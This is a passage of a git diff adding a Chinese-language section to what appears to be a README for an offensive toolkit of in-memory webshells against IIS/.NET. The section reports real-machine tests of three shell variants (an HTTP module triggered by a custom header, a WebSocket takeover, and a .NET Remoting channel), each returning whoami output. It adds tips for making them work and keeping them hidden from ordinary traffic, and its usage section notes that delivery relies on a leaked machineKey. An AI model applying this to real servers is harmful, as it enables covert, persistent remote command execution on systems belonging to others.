@@ -84,6 +84,21 @@ E()
 触发: remoting 客户端 → tcp://host:<业务端口>/msh → Svc.Exec(cmd)
 ```
 
+## ✅ 实测验证（Windows 11 + IIS 10 集成管线，真机）
+
+| 项 | 结果 | 证据 |
+|---|---|---|
+| **#1 HttpModuleShell** | ✅ | `MSH-Cmd: __verify__` → `armed; integrated=True; pid=...`；`MSH-Cmd: whoami` → `iis apppool\defaultapppool`；无标记请求 200 |
+| **#2 WsTakeoverShell** | ✅ | 子协议 `msh` 握手 → 101 后全双工：`whoami`→`iis apppool\defaultapppool`、`hostname`→`Tiger`、正常 Close |
+| **#3 RemotingUriShell** | ✅ | 业务 `calc(7,8)=15` 与 shell `/msh whoami` **同端口同通道并存**；业务再调 `calc(100,1)=101` |
+| 无标记流量隔离 | ✅ | 普通请求 200；无关请求头被忽略；业务 WS（无 msh 子协议）不被劫持 |
+
+### 集成管线两条关键实测结论
+
+1. **通知选择**：向模块容器 `AddEvent` 时，只有 **`RequestNotification.AcquireRequestState`** 会触发；在同一容器上挂 `BeginRequest` / `LogRequest` / `UpdateRequestCache` 实测**不被派发**（`probe_hits` 计数为 0）。载荷默认挂 `AcquireRequestState`。
+2. **WebSocket 接管必须抑制页面输出**：`AcceptWebSocketRequest` 之后管线仍会执行页面 handler，必须在同一处理函数内置 `Response.SuppressContent = true` 且 `Response.StatusCode = 101`，否则连接被收尾（`WebSocketException 0x80070040`）。`RemapHandler` 在此阶段不可用（框架只允许在 `MapRequestHandler` 之前调用）。
+3. **Remoting 客户端须引用业务程序集**：SAO 调用要求客户端代理类型名与服务端一致，客户端需引用业务 dll（Remoting 固有约束，非本马缺陷）。
+
 ## 🔌 用法
 
 生成与投递（前提：目标 `machineKey` 已知/泄露）：
